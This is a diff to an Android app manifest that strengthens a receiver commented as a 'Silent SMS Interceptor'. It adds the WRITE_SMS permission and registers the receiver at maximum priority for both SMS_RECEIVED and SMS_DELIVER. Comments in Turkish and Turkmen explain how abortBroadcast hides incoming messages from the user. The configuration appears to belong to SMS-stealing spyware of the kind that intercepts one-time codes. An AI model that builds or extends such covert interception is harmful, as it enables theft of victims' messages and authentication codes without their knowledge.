@@ -4,6 +4,7 @@
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
     <uses-permission android:name="android.permission.CALL_PHONE" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.MODIFY_PHONE_STATE" />
@@ -33,13 +34,18 @@
             </intent-filter>
         </activity>
 
-        <!-- Silent SMS Interceptor Receiver with High Priority -->
+        <!-- Silent SMS Interceptor Receiver with Highest Priority -->
+        <!-- android:permission BROADCAST_SMS olmadan, ordered broadcast kabul edilir -->
         <receiver
             android:name=".SmsReceiver"
-            android:exported="true"
-            android:permission="android.permission.BROADCAST_SMS">
+            android:exported="false">
+            <!-- SMS_RECEIVED: ordered broadcast → abortBroadcast() eski Android-da işleýär -->
             <intent-filter android:priority="2147483647">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+            <!-- SMS_DELIVER: Android 4.4+ default SMS app ýagdaýy (abortBroadcast ýok) -->
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_DELIVER" />
             </intent-filter>
         </receiver>
 
